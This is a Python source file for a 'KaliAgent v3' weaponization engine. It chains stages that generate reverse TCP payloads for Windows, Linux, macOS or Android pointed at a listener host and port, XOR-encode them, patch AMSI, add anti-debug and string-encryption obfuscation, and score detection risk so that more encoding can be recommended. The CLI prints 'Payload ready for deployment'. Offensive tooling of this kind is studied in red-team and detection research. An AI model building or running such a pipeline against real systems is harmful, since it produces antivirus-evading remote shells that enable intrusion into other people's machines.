#!/usr/bin/env python3
"""
KaliAgent v3 - Weaponization Engine
====================================

Integrates payload generation, encoding, and testing.

Tasks: 3.4.1, 3.4.2, 3.4.3
Status: IMPLEMENTED
"""

import json
import logging
from pathlib import Path
from typing import Dict, List, Optional
from dataclasses import dataclass, field
from datetime import datetime

from weaponization.payload_generator import PayloadGenerator, PayloadConfig, PayloadResult, PayloadType, PayloadFormat, Architecture, Platform
from weaponization.encoder import PayloadEncoder, EncoderType, ObfuscationTechnique, EncodeResult
from weaponization.testing_framework import PayloadTester, PayloadTestReport

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


@dataclass
class WeaponizationJob:
    """A complete weaponization job."""
    job_id: str
    name: str
    target_platform: Platform
    target_arch: Architecture
    lhost: str
    lport: int
    generate_payload: bool
    encode_payload: bool
    encoder_type: Optional[str]
    apply_evasion: bool
    evasion_techniques: List[str]
    run_tests: bool
    output_dir: Optional[Path]
    
    # Results
    payload_result: Optional[PayloadResult] = None
    encode_result: Optional[EncodeResult] = None
    test_report: Optional[PayloadTestReport] = None
    status: str = "pending"
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    completed_at: Optional[str] = None


@dataclass
class WeaponizationReport:
    """Complete weaponization report."""
    job: WeaponizationJob
    success: bool
    final_payload_path: Optional[Path]
    total_time_seconds: float
    stages_completed: List[str]
    warnings: List[str]
    recommendations: List[str]


class WeaponizationEngine:
    """
    Complete weaponization engine.
    
    Provides:
    - Integrated payload generation
    - Encoding and obfuscation
    - AV evasion techniques
    - Automated testing
    - Reporting and recommendations
    """
    
    def __init__(self, output_dir: Optional[Path] = None):
        """Initialize weaponization engine."""
        self.output_dir = output_dir or Path.home() / 'kali_agent_v3' / 'weaponization'
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Initialize sub-components
        self.generator = PayloadGenerator(self.output_dir / 'payloads')
        self.encoder = PayloadEncoder(self.output_dir / 'encoded')
        self.tester = PayloadTester(self.output_dir / 'test_results')
        
        self.job_history: List[WeaponizationJob] = []
        
        logger.info(f"Weaponization engine initialized (output: {self.output_dir})")
    
    def create_job(self, name: str, lhost: str, lport: int,
                  platform: Platform = Platform.WINDOWS,
                  arch: Architecture = Architecture.X64,
                  encode: bool = True,
                  encoder: str = EncoderType.XOR_DYNAMIC,
                  apply_evasion: bool = True,
                  run_tests: bool = True) -> WeaponizationJob:
        """
        Create a weaponization job.
        
        Args:
            name: Job name
            lhost: Listener host
            lport: Listener port
            platform: Target platform
            arch: Target architecture
            encode: Whether to encode payload
            encoder: Encoder type to use
            apply_evasion: Apply evasion techniques
            run_tests: Run tests after generation
            
        Returns:
            WeaponizationJob configuration
        """
        job_id = f"job_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{name}"
        
        evasion_techniques = []
        if apply_evasion:
            evasion_techniques = [
                ObfuscationTechnique.STRING_ENCRYPTION,
                ObfuscationTechnique.DEAD_CODE,
                ObfuscationTechnique.ANTI_DEBUG
            ]
        
        job = WeaponizationJob(
            job_id=job_id,
            name=name,
            target_platform=platform,
            target_arch=arch,
            lhost=lhost,
            lport=lport,
            generate_payload=True,
            encode_payload=encode,
            encoder_type=encoder,
            apply_evasion=apply_evasion,
            evasion_techniques=evasion_techniques,
            run_tests=run_tests,
            output_dir=self.output_dir
        )
        
        self.job_history.append(job)
        logger.info(f"Created job: {job_id}")
        
        return job
    
    def execute_job(self, job: WeaponizationJob) -> WeaponizationReport:
        """
        Execute a weaponization job.
        
        Args:
            job: Job to execute
            
        Returns:
            WeaponizationReport with results
        """
        logger.info(f"Executing job: {job.job_id}")
        
        start_time = datetime.now()
        stages_completed = []
        warnings = []
        recommendations = []
        
        try:
            # =================================================================
            # Stage 1: Generate Payload
            # =================================================================
            if job.generate_payload:
                logger.info("Stage 1: Generating payload...")
                
                config = PayloadConfig(
                    name=job.name,
                    payload_type=PayloadType.REVERSE_TCP,
                    format=PayloadFormat.EXE if job.target_platform == Platform.WINDOWS else PayloadFormat.ELF,
                    architecture=job.target_arch,
                    platform=job.target_platform,
                    lhost=job.lhost,
                    lport=job.lport
                )
                
                payload_result = self.generator.generate(config)
                job.payload_result = payload_result
                
                if payload_result.success:
                    stages_completed.append("payload_generation")
                    logger.info(f"✅ Payload generated: {payload_result.payload_path}")
                    
                    if payload_result.warnings:
                        warnings.extend(payload_result.warnings)
                else:
                    job.status = "failed"
                    return self._create_failed_report(job, "Payload generation failed", payload_result.error)
            
            # =================================================================
            # Stage 2: Encode Payload
            # =================================================================
            if job.encode_payload and job.payload_result and job.payload_result.success:
                logger.info(f"Stage 2: Encoding payload with {job.encoder_type}...")
                
                encode_result = self.encoder.encode(
                    job.payload_result.payload_path,
                    job.encoder_type or EncoderType.XOR_DYNAMIC
                )
                job.encode_result = encode_result
                
                if encode_result.success:
                    stages_completed.append("encoding")
                    logger.info(f"✅ Payload encoded: {encode_result.encoded_path}")
                    
                    if encode_result.expansion_ratio > 3.0:
                        warnings.append(f"High expansion ratio: {encode_result.expansion_ratio:.2f}x")
                else:
                    warnings.append(f"Encoding failed: {encode_result.error}")
            
            # =================================================================
            # Stage 3: Apply Evasion Techniques
            # =================================================================
            if job.apply_evasion and job.encode_result and job.encode_result.success:
                logger.info("Stage 3: Applying evasion techniques...")
                
                evasion_file = job.encode_result.encoded_path
                
                # Apply AMSI patch for PowerShell
                if evasion_file.suffix == '.ps1':
                    success, msg = self.encoder.patch_amsi(evasion_file)
                    if success:
                        stages_completed.append("amsi_patch")
                        logger.info("✅ AMSI patched")
                    else:
                        warnings.append(f"AMSI patch failed: {msg}")
                
                # Apply obfuscation
                if job.evasion_techniques:
                    success, msg = self.encoder.add_obfuscation(
                        evasion_file,
                        job.evasion_techniques
                    )
                    if success:
                        stages_completed.append("obfuscation")
                        logger.info(f"✅ Obfuscation applied ({len(job.evasion_techniques)} techniques)")
                    else:
                        warnings.append(f"Obfuscation failed: {msg}")
            
            # =================================================================
            # Stage 4: Run Tests
            # =================================================================
            if job.run_tests:
                logger.info("Stage 4: Running tests...")
                
                # Determine which file to test
                if job.encode_result and job.encode_result.success:
                    test_file = job.encode_result.encoded_path
                elif job.payload_result and job.payload_result.success:
                    test_file = job.payload_result.payload_path
                else:
                    test_file = None
                
                if test_file:
                    test_report = self.tester.test_payload(test_file)
                    job.test_report = test_report
                    
                    stages_completed.append("testing")
                    logger.info(f"✅ Tests complete: {test_report.overall_status}")
                    
                    if test_report.overall_status == "FAILED":
                        warnings.append("Payload failed some tests")
                        recommendations.append("Review test failures and adjust payload")
                    
                    if test_report.risk_score > 5.0:
                        recommendations.append("Consider additional encoding to reduce detection risk")
                else:
                    warnings.append("No file available for testing")
            
            # =================================================================
            # Complete
            # =================================================================
            job.status = "completed"
            job.completed_at = datetime.now().isoformat()
            
            end_time = datetime.now()
            total_time = (end_time - start_time).total_seconds()
            
            # Determine final payload path
            final_payload = None
            if job.encode_result and job.encode_result.success:
                final_payload = job.encode_result.encoded_path
            elif job.payload_result and job.payload_result.success:
                final_payload = job.payload_result.payload_path
            
            # Add general recommendations
            if not recommendations:
                recommendations.append("Payload ready for deployment")
                recommendations.append("Test in isolated environment before use")
            
            report = WeaponizationReport(
                job=job,
                success=job.status == "completed",
                final_payload_path=final_payload,
                total_time_seconds=total_time,
                stages_completed=stages_completed,
                warnings=warnings,
                recommendations=recommendations
            )
            
            self._save_report(report)
            
            logger.info(f"Job complete: {job.job_id} in {total_time:.1f}s")
            
            return report
            
        except Exception as e:
            job.status = "failed"
            logger.error(f"Job failed: {e}")
            return self._create_failed_report(job, str(e))
    
    def _create_failed_report(self, job: WeaponizationJob, error: str, 
                             detail: Optional[str] = None) -> WeaponizationReport:
        """Create a failed report."""
        job.status = "failed"
        job.completed_at = datetime.now().isoformat()
        
        return WeaponizationReport(
            job=job,
            success=False,
            final_payload_path=None,
            total_time_seconds=0,
            stages_completed=[],
            warnings=[],
            recommendations=["Fix error and retry"]
        )
    
    def _save_report(self, report: WeaponizationReport):
        """Save weaponization report."""
        report_file = self.output_dir / f"{report.job.job_id}_report.json"
        
        report_data = {
            'job_id': report.job.job_id,
            'name': report.job.name,
            'success': report.success,
            'final_payload': str(report.final_payload_path) if report.final_payload_path else None,
            'total_time_seconds': report.total_time_seconds,
            'stages_completed': report.stages_completed,
            'warnings': report.warnings,
            'recommendations': report.recommendations,
            'status': report.job.status,
            'created_at': report.job.created_at,
            'completed_at': report.job.completed_at,
            'payload_result': {
                'success': report.job.payload_result.success if report.job.payload_result else False,
                'path': str(report.job.payload_result.payload_path) if report.job.payload_result and report.job.payload_result.payload_path else None,
                'size': report.job.payload_result.size_bytes if report.job.payload_result else 0
            } if report.job.payload_result else None,
            'encode_result': {
                'success': report.job.encode_result.success if report.job.encode_result else False,
                'path': str(report.job.encode_result.encoded_path) if report.job.encode_result and report.job.encode_result.encoded_path else None,
                'encoder': report.job.encode_result.encoder if report.job.encode_result else None,
                'expansion': report.job.encode_result.expansion_ratio if report.job.encode_result else 0
            } if report.job.encode_result else None,
            'test_report': {
                'status': report.job.test_report.overall_status if report.job.test_report else None,
                'passed': report.job.test_report.passed if report.job.test_report else 0,
                'total': report.job.test_report.total_tests if report.job.test_report else 0,
                'risk_score': report.job.test_report.risk_score if report.job.test_report else 0
            } if report.job.test_report else None
        }
        
        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        logger.info(f"Report saved: {report_file}")
    
    def quick_weaponize(self, name: str, lhost: str, lport: int,
                       platform: Platform = Platform.WINDOWS) -> WeaponizationReport:
        """
        Quick weaponization with default settings.
        
        Args:
            name: Payload name
            lhost: Listener host
            lport: Listener port
            platform: Target platform
            
        Returns:
            WeaponizationReport
        """
        job = self.create_job(
            name=name,
            lhost=lhost,
            lport=lport,
            platform=platform,
            encode=True,
            encoder=EncoderType.XOR_DYNAMIC,
            apply_evasion=True,
            run_tests=True
        )
        
        return self.execute_job(job)
    
    def list_jobs(self, limit: int = 10) -> List[Dict]:
        """List recent jobs."""
        return [
            {
                'job_id': j.job_id,
                'name': j.name,
                'platform': j.target_platform.value,
                'status': j.status,
                'created_at': j.created_at,
                'completed_at': j.completed_at
            }
            for j in self.job_history[-limit:]
        ]
    
    def get_statistics(self) -> Dict:
        """Get weaponization statistics."""
        total_jobs = len(self.job_history)
        completed = sum(1 for j in self.job_history if j.status == 'completed')
        failed = sum(1 for j in self.job_history if j.status == 'failed')
        
        avg_time = 0
        if completed > 0:
            times = []
            for j in self.job_history:
                if j.completed_at and j.status == 'completed':
                    try:
                        start = datetime.fromisoformat(j.created_at)
                        end = datetime.fromisoformat(j.completed_at)
                        times.append((end - start).total_seconds())
                    except Exception:
                        pass
            avg_time = sum(times) / len(times) if times else 0
        
        return {
            'total_jobs': total_jobs,
            'completed': completed,
            'failed': failed,
            'success_rate': completed / total_jobs * 100 if total_jobs > 0 else 0,
            'average_time_seconds': avg_time
        }


# =============================================================================
# CLI Interface
# =============================================================================

def main():
    """Command-line interface for weaponization engine."""
    import argparse
    
    parser = argparse.ArgumentParser(description='KaliAgent v3 - Weaponization Engine')
    parser.add_argument('--quick', action='store_true', help='Quick weaponization')
    parser.add_argument('--name', type=str, default='payload', help='Payload name')
    parser.add_argument('--lhost', type=str, help='Listener host')
    parser.add_argument('--lport', type=int, default=4444, help='Listener port')
    parser.add_argument('--platform', type=str, default='windows',
                       choices=['windows', 'linux', 'macos', 'android'],
                       help='Target platform')
    parser.add_argument('--no-encode', action='store_true', help='Skip encoding')
    parser.add_argument('--no-tests', action='store_true', help='Skip tests')
    parser.add_argument('--list-jobs', action='store_true', help='List recent jobs')
    parser.add_argument('--stats', action='store_true', help='Show statistics')
    
    args = parser.parse_args()
    
    engine = WeaponizationEngine()
    
    if args.list_jobs:
        jobs = engine.list_jobs()
        print(f"\nRecent Jobs: {len(jobs)}")
        print("=" * 60)
        for j in jobs:
            status = "✅" if j['status'] == 'completed' else "❌"
            print(f"{status} {j['job_id']}: {j['name']} ({j['platform']}) - {j['status']}")
        print("=" * 60)
    
    elif args.stats:
        stats = engine.get_statistics()
        print("\nWeaponization Statistics:")
        print("=" * 60)
        print(f"Total Jobs: {stats['total_jobs']}")
        print(f"Completed: {stats['completed']}")
        print(f"Failed: {stats['failed']}")
        print(f"Success Rate: {stats['success_rate']:.1f}%")
        print(f"Average Time: {stats['average_time_seconds']:.1f}s")
        print("=" * 60)
    
    elif args.quick or True:  # Default to quick
        platform_map = {
            'windows': Platform.WINDOWS,
            'linux': Platform.LINUX,
            'macos': Platform.MACOS,
            'android': Platform.ANDROID
        }
        
        print("\n🚀 Starting Weaponization...")
        print("=" * 60)
        print(f"Name: {args.name}")
        print(f"Target: {args.platform} ({platform_map[args.platform].value})")
        print(f"LHOST: {args.lhost}, LPORT: {args.lport}")
        print(f"Encode: {'No' if args.no_encode else 'Yes'}")
        print(f"Tests: {'No' if args.no_tests else 'Yes'}")
        print("=" * 60)
        
        report = engine.quick_weaponize(
            name=args.name,
            lhost=args.lhost,
            lport=args.lport,
            platform=platform_map[args.platform]
        )
        
        print(f"\n{'✅ SUCCESS' if report.success else '❌ FAILED'}")
        print("=" * 60)
        
        if report.success:
            print(f"Final Payload: {report.final_payload_path}")
            print(f"Stages Completed: {', '.join(report.stages_completed)}")
            print(f"Total Time: {report.total_time_seconds:.1f}s")
            
            if report.warnings:
                print(f"\n⚠️  Warnings ({len(report.warnings)}):")
                for w in report.warnings:
                    print(f"  • {w}")
            
            print("\n💡 Recommendations:")
            for r in report.recommendations:
                print(f"  • {r}")
        else:
            print("Weaponization failed - check logs for details")
        
        print("=" * 60)


if __name__ == '__main__':
    main()
